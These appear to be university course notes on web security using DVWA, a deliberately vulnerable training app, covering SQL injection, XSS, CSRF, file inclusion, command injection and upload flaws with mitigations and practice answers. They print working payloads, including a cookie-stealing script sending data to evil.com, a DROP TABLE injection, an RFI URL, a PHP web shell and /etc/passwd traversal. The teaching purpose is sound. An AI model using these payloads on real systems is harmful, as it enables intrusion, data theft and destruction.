---
title: "Damn Vulnerable Web Application (DVWA)"
subject: "FUNDAMENTALS OF CYBER SECURITY"
module: "Module 2: Web Security"
branch: "Computer Science and Engineering"
semester: 6
topicId: "684162780fc9aa1fdbc8be37"
status: "completed"
scrapedAt: "2026-05-20T16:54:31.722Z"
---
# FUNDAMENTALS OF CYBER SECURITY - Module 2: Web Security - DVWA

## Introduction to Damn Vulnerable Web Application (DVWA)

DVWA (Damn Vulnerable Web Application) is a purposefully vulnerable web application used for educational purposes to learn about web security vulnerabilities and penetration testing. It's a valuable tool for beginners to get hands-on experience in identifying and exploiting common web application flaws in a safe and controlled environment.

**Learning Outcomes:**

*   Understand the purpose and setup of DVWA.
*   Identify and exploit common web vulnerabilities in DVWA, including:
    *   SQL Injection (SQLi)
    *   Cross-Site Scripting (XSS)
    *   Cross-Site Request Forgery (CSRF)
    *   File Inclusion (LFI/RFI)
    *   Command Injection
    *   Brute Force
    *   Uploaded File Execution
    *   Insecure CAPTCHA
    *   Client-Side Vulnerabilities

### 1. Purpose and Setup of DVWA

*   **Purpose:**
    *   **Education:** To provide a practical environment for learning about web application security.
    *   **Training:** To train security professionals and developers in vulnerability identification and exploitation.
    *   **Testing:** To test security tools and techniques.
    *   **Demonstration:** To demonstrate the impact of web application vulnerabilities.

*   **Key Concepts:**
    *   **Vulnerability:** A weakness in a system that can be exploited by a threat actor to perform unauthorized actions.
    *   **Exploit:** A technique or tool used to take advantage of a vulnerability.
    *   **Penetration Testing:** The practice of simulating an attack to identify and exploit vulnerabilities.

*   **Setup:**
    *   **Requirements:**
        *   Web server (Apache, Nginx)
        *   PHP
        *   MySQL/MariaDB database
    *   **Installation Steps (General):**
        1.  **Download DVWA:** Obtain the latest version from a trusted source (e.g., GitHub).
        2.  **Extract the files:** Extract the downloaded archive to your web server's document root (e.g., `/var/www/html/dvwa`).
        3.  **Configure the Database:**
            *   Edit the `config/config.inc.php` file.
            *   Set the database hostname, username, and password. The default database name is `dvwa`.  If the database doesn't exist, DVWA provides a setup option.
            *   Often, the default credentials are `root` and a blank password.
        4.  **Set file permissions:**  Ensure web server has write access to the `dvwa/config` directory.
        5.  **Access DVWA through a browser:** Open `http://localhost/dvwa` (or the appropriate URL based on your web server setup).
        6.  **Run the Setup:** Click on the "Create/Reset Database" button to set up the necessary database tables.
        7.  **Login:** Use the default credentials: username `admin` and password `password`.
        8.  **Set Security Level:** DVWA has security levels (Low, Medium, High, Impossible) to simulate different levels of protection. Start with 'Low' to learn the basics.

*   **Important:**  **Never** deploy DVWA on a production server or a publicly accessible network. It is inherently insecure and will be easily compromised.

### 2. Common Web Vulnerabilities in DVWA

#### 2.1 SQL Injection (SQLi)

*   **Definition:** A vulnerability that allows an attacker to inject malicious SQL code into database queries, potentially bypassing security measures and gaining unauthorized access to data.

*   **Types:**
    *   **Error-based SQLi:** Relies on error messages from the database to gain information about the database structure.
    *   **Union-based SQLi:** Uses the `UNION` SQL operator to combine the results of multiple queries, allowing the attacker to retrieve data from other tables.
    *   **Blind SQLi:**  The attacker cannot see the results of the injected SQL queries directly. They infer information based on the application's behavior (e.g., timing delays or different responses).  *Time-based blind SQLi* causes delays based on the injected command's execution. *Boolean-based blind SQLi* results in true or false responses based on the injected command.

*   **DVWA Examples:**
    *   **Low:** Simple injection directly into the query without proper sanitization or parameterization. Example payload: `1' OR '1'='1` in the user ID field.
    *   **Medium:** Attempts to filter out some common SQL injection characters (e.g., single quotes, double quotes). However, it can often be bypassed with different encoding or techniques.
    *   **High:**  Uses parameterized queries or prepared statements, which are generally more secure.  However, it may still be vulnerable if other parts of the application aren't properly secured.
    *   **Impossible:**  Uses secure coding practices like parameterized queries and input validation to prevent SQL injection.

*   **Key Payloads (Examples):**
    *   `' OR 1=1 --` (Comment out the rest of the query)
    *   `' UNION SELECT username, password FROM users --` (Retrieve username and password from the users table)
    *   `'; DROP TABLE users; --` (Potentially drop the users table, depending on database permissions)
    *   `1' AND SLEEP(5) --` (Time-based Blind SQLi)

*   **Mitigation:**
    *   **Parameterized Queries (Prepared Statements):**  Treat user input as data, not executable code.
    *   **Input Validation:**  Validate and sanitize user input to remove or escape potentially harmful characters.
    *   **Least Privilege:**  Grant database users only the necessary permissions.
    *   **Web Application Firewalls (WAFs):** Filter malicious traffic.

#### 2.2 Cross-Site Scripting (XSS)

*   **Definition:** A vulnerability that allows an attacker to inject malicious scripts into a website, which are then executed by other users' browsers. This can be used to steal cookies, redirect users to malicious sites, or deface the website.

*   **Types:**
    *   **Reflected XSS:**  The malicious script is embedded in a URL or form input and is reflected back to the user by the server.
    *   **Stored XSS (Persistent XSS):** The malicious script is stored on the server (e.g., in a database or comment section) and is executed whenever a user views the affected page.
    *   **DOM-based XSS:**  The vulnerability exists in client-side JavaScript code that manipulates the Document Object Model (DOM). The payload does not need to be sent to the server.

*   **DVWA Examples:**
    *   **Low:** No input validation or encoding.  Simple payload: `<script>alert('XSS')</script>`.
    *   **Medium:** Attempts to filter out `<script>` tags, but can often be bypassed using techniques like: `<img src=x onerror=alert('XSS')>`.
    *   **High:**  More robust filtering, but might be bypassed with less common techniques or encoding.
    *   **Impossible:**  Uses proper escaping and encoding of user input to prevent script execution.

*   **Key Payloads (Examples):**
    *   `<script>alert('XSS')</script>` (Simple alert)
    *   `<script>window.location='http://evil.com/steal.php?cookie='+document.cookie</script>` (Steal cookies)
    *   `<img src=x onerror=alert('XSS')>` (Alternative to script tag)

*   **Mitigation:**
    *   **Input Validation and Sanitization:** Remove or escape potentially harmful characters.
    *   **Output Encoding:** Encode user input before displaying it on the page (e.g., HTML encoding).
    *   **Content Security Policy (CSP):** Define which sources of content (scripts, styles, images) are allowed to be loaded by the browser.
    *   **HttpOnly Cookie Attribute:** Prevents JavaScript from accessing cookies.

#### 2.3 Cross-Site Request Forgery (CSRF)

*   **Definition:**  An attack that forces an authenticated user to perform unintended actions on a web application.  The attacker tricks the user's browser into sending a request to a vulnerable website on their behalf without their knowledge or consent.

*   **DVWA Examples:**
    *   **Low:** No CSRF protection. An attacker can easily construct a malicious link or form that, when clicked by an authenticated user, performs an action on the website (e.g., changing their password).
    *   **Medium:** Uses a referrer check to try to prevent CSRF attacks, but this can be bypassed by manipulating the referrer header.
    *   **High:** Uses a secret token embedded in the form to protect against CSRF.  The token is validated by the server.
    *   **Impossible:**  Uses strong CSRF tokens and proper validation.

*   **Example:**  A malicious website containing the following HTML:

    ```html
    <img src="http://vulnerable-site.com/change_password.php?password=attackerpassword">
    ```

    If a user is logged into `vulnerable-site.com`, their password will be changed to `attackerpassword` when the user visits the malicious site (because the browser automatically sends cookies with requests to the same domain).

*   **Mitigation:**
    *   **CSRF Tokens:**  Generate a unique, unpredictable token for each user session and include it in every form. The server validates the token before processing the request.
    *   **SameSite Cookie Attribute:**  Controls how cookies are sent with cross-site requests.  Setting the attribute to `Strict` or `Lax` can prevent CSRF attacks.
    *   **Double Submit Cookies:**  Set a cookie with a random value and include the same value in a hidden form field.  The server verifies that both values match.

#### 2.4 File Inclusion (LFI/RFI)

*   **Definition:** A vulnerability that allows an attacker to include files on a web server, potentially leading to the execution of arbitrary code or disclosure of sensitive information.

*   **Types:**
    *   **Local File Inclusion (LFI):** Allows the attacker to include local files on the server.
    *   **Remote File Inclusion (RFI):** Allows the attacker to include remote files from another server.

*   **DVWA Examples:**
    *   **Low:** No input validation.  An attacker can use paths like `../../../../etc/passwd` (LFI) or `http://evil.com/malicious.php` (RFI) to include files.
    *   **Medium:** Attempts to filter out some characters or prefixes, but can often be bypassed.
    *   **High:**  Uses a whitelist of allowed files to prevent arbitrary file inclusion.
    *   **Impossible:**  Does not allow user-controlled file paths.

*   **Example (LFI):**  A URL like `http://vulnerable-site.com/index.php?page=home.php` might be vulnerable to LFI if `home.php` can be replaced with `../../../../etc/passwd`.

*   **Example (RFI):** A URL like `http://vulnerable-site.com/index.php?page=http://evil.com/malicious.php` might be vulnerable to RFI if remote file inclusion is enabled and allowed by the server's configuration.  The remote file could contain PHP code that will be executed on the vulnerable server.

*   **Mitigation:**
    *   **Input Validation:**  Validate and sanitize user input to ensure that it only contains allowed characters and file names.
    *   **Whitelist Allowed Files:**  Only allow inclusion of specific files or directories.
    *   **Disable Remote File Inclusion:** If RFI is not required, disable it in the PHP configuration (e.g., `allow_url_include = Off`).
    *   **Chroot Environment:** Restrict the web server's access to a specific directory.

#### 2.5 Command Injection

*   **Definition:**  A vulnerability that allows an attacker to execute arbitrary commands on the server operating system by injecting them into a shell command.

*   **DVWA Examples:**
    *   **Low:** No input validation. An attacker can use commands like `; ls -la` or `&& whoami` to execute arbitrary commands.
    *   **Medium:**  Attempts to filter out some characters, but can often be bypassed using different encoding or techniques.
    *   **High:**  More robust filtering, but might be bypassed using less common techniques.
    *   **Impossible:**  Uses proper input validation and escaping to prevent command execution.

*   **Example:**  A vulnerable application that uses the `ping` command based on user input:

    If the user enters `127.0.0.1`, the command executed might be: `ping 127.0.0.1`.
    If the user enters `127.0.0.1; ls -la`, the command executed might be: `ping 127.0.0.1; ls -la` (executing both `ping` and `ls -la`).

*   **Mitigation:**
    *   **Input Validation:** Validate and sanitize user input to remove or escape potentially harmful characters.
    *   **Parameterized Queries (if applicable):**  Treat user input as data, not executable code.
    *   **Principle of Least Privilege:**  Run the web server and related processes with the minimum necessary privileges.
    *   **Avoid System Calls:** Avoid using system calls or shell commands whenever possible.

#### 2.6 Brute Force

*   **Definition:** An attack that attempts to guess a password by trying all possible combinations of characters until the correct password is found.

*   **DVWA Examples:**
    *   **Low:** No rate limiting or account lockout. An attacker can try unlimited password attempts.
    *   **Medium:**  Implements a basic delay after a certain number of failed login attempts.
    *   **High:** Implements more robust rate limiting and may use CAPTCHAs to prevent automated attacks.
    *   **Impossible:** Implements strong password policies, account lockout, and CAPTCHAs to prevent brute force attacks.

*   **Mitigation:**
    *   **Strong Password Policies:** Require users to create strong passwords that are difficult to guess.
    *   **Account Lockout:** Lock accounts after a certain number of failed login attempts.
    *   **Rate Limiting:** Limit the number of login attempts that can be made within a certain period of time.
    *   **CAPTCHAs:** Use CAPTCHAs to prevent automated attacks.
    *   **Multi-Factor Authentication (MFA):** Require users to provide multiple forms of authentication.

#### 2.7 Uploaded File Execution

*   **Definition:**  A vulnerability that allows an attacker to upload a malicious file (e.g., a PHP script) to a web server and then execute it, potentially gaining control of the server.

*   **DVWA Examples:**
    *   **Low:** No file type validation. An attacker can upload a PHP script with a `.php` extension and execute it.
    *   **Medium:**  Attempts to filter out some file extensions, but can often be bypassed by renaming the file or using different extensions.
    *   **High:** Checks the file extension and MIME type, but can be bypassed by manipulating the MIME type.
    *   **Impossible:**  Uses strong file validation and stores uploaded files in a non-executable directory.

*   **Example:**  Uploading a file named `shell.php` with the following content:

    ```php
    <?php system($_GET['cmd']); ?>
    ```

    Then accessing `http://vulnerable-site.com/uploads/shell.php?cmd=whoami` would execute the `whoami` command on the server.

*   **Mitigation:**
    *   **File Type Validation:** Validate the file type based on its content (magic number) and not just the file extension.
    *   **Rename Files:**  Rename uploaded files to prevent attackers from guessing the URL.
    *   **Store Files in a Non-Executable Directory:** Store uploaded files outside of the web server's document root or in a directory where script execution is disabled (e.g., using `.htaccess` file).
    *   **Content Security Policy (CSP):** Restrict the execution of scripts from uploaded file directories.

#### 2.8 Insecure CAPTCHA

*   **Definition:** A CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) is a security measure designed to prevent automated bots from performing actions on a website. An insecure CAPTCHA can be bypassed by bots, rendering it ineffective.

*   **DVWA Examples:**
    *   **Low:** The CAPTCHA challenge is weak and easy to solve programmatically.  The answer is often predictable or stored in a hidden field.
    *   **Medium:**  A slightly more complex CAPTCHA, but still vulnerable to OCR (Optical Character Recognition) or other automated techniques.
    *   **High:**  A more robust CAPTCHA that is harder to bypass automatically.  May use techniques like audio challenges or distorted images.
    *   **Impossible:**  Uses a strong CAPTCHA implementation combined with rate limiting to prevent automated attacks.

*   **Mitigation:**
    *   **Use Reputable CAPTCHA Services:**  Use well-established CAPTCHA services like reCAPTCHA or hCaptcha.
    *   **Combine CAPTCHAs with Other Security Measures:**  Use CAPTCHAs in conjunction with rate limiting and account lockout to provide multiple layers of protection.
    *   **Regularly Update CAPTCHA Libraries:** Keep CAPTCHA libraries up to date to address known vulnerabilities.

#### 2.9 Client-Side Vulnerabilities

*   **Definition:** These vulnerabilities rely on flaws in how the client-side code (primarily JavaScript) is handled by the user's browser.  While many vulnerabilities listed above have a client-side component, this category focuses on vulnerabilities *primarily* located in client-side code.

*   **DVWA Examples:**
    *   **DOM-based XSS (See XSS above):**  The vulnerability exists in client-side JavaScript code that manipulates the Document Object Model (DOM).  The payload may not even be sent to the server.
    *   **HTML Injection:**  Injecting HTML code into a webpage, allowing the attacker to modify the page's appearance or content.  Similar to XSS but does not necessarily require JavaScript.
    *   **Cookie Manipulation:**  Modifying client-side cookies to gain unauthorized access or privileges.
    *   **Local Storage Manipulation:**  Modifying data stored in the browser's local storage to alter application behavior.

*   **Mitigation:**
    *   **Input Validation and Sanitization (Even Client-Side):** Validate and sanitize user input on the client-side before using it to manipulate the DOM or store it in cookies or local storage.
    *   **Output Encoding (Client-Side):** Encode data before displaying it on the page.
    *   **Use Secure APIs:**  Use secure APIs for interacting with the browser's DOM, cookies, and local storage.
    *   **Regular Security Audits:**  Conduct regular security audits of client-side code to identify and fix vulnerabilities.
    *   **Content Security Policy (CSP):** CSP can help prevent some client-side attacks by restricting the sources of content that the browser is allowed to load.

### Practice Questions/Exercises

1.  **SQL Injection (Low Security):**  How would you retrieve the password for the user with ID '2' using SQL injection on the DVWA 'Low' security level SQL Injection page?

    *   **Answer:** `2' UNION SELECT username,password FROM users WHERE user_id = 2 --`

2.  **XSS (Stored, Low Security):** How would you inject a persistent XSS payload on the DVWA Guestbook at 'Low' security that displays an alert box every time a user visits the guestbook page?

    *   **Answer:**  Input `<script>alert('XSS')</script>` into the Name and Message fields.

3.  **CSRF (Low Security):**  If a user is logged into DVWA and the password change form is vulnerable to CSRF (Low security), how could you create a link that, when clicked, would change the user's password to 'newpassword'?

    *   **Answer:**  `<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=newpassword&password_conf=newpassword&Change=Change">` (Replace `localhost` with the correct DVWA URL).

4.  **File Inclusion (LFI, Low Security):**  How would you attempt to read the contents of the `/etc/passwd` file on a Linux server using LFI in DVWA 'Low'?

    *   **Answer:**  `http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd` (Replace `localhost` with the correct DVWA URL).

5.  **Command Injection (Low Security):**  Using the DVWA Command Injection page at the 'Low' security level, how can you execute the command `ls -la` after pinging an IP address?

    *   **Answer:** Provide input such as `127.0.0.1; ls -la`

### Important Points to Remember

*   **DVWA is for learning purposes only.**  Never deploy it on a production server.
*   **Understand the underlying principles.** Don't just copy and paste exploits. Learn *why* they work.
*   **Practice different security levels.** Start with 'Low' and gradually increase the security level to challenge yourself.
*   **Read the source code.** DVWA's source code is readily available, allowing you to understand how the vulnerabilities are implemented and how the mitigations work.
*   **Use security tools.**  Learn to use tools like Burp Suite or OWASP ZAP to identify and exploit vulnerabilities.
*   **Stay updated.** Web security is constantly evolving. Keep learning about new vulnerabilities and mitigation techniques.
*   **Ethical Hacking:** Use these skills responsibly and ethically.  Always obtain permission before testing the security of any system that you do not own.
